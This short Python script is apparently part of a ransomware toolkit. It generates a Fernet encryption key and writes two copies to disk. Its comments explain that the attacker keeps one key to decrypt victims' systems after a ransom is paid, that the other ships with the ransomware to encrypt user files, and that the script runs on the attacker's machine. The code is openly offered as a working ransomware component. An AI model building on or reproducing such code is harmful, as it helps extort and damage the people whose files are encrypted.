from cryptography.fernet import Fernet

# Two copies of the key are generated. One to be kept
# by the attacker to decrypt the system once ransom is paid,
# the other is packaged with the ransomware in order to encrypt 
# user files as well as itself.

# THIS SCRIPT IS RUN ON THE ATTACKER MACHINE

key = Fernet.generate_key()

with open("master.key", "wb") as master:
	master.write(key)

with open("local.key", "wb") as master:
	master.write(key)

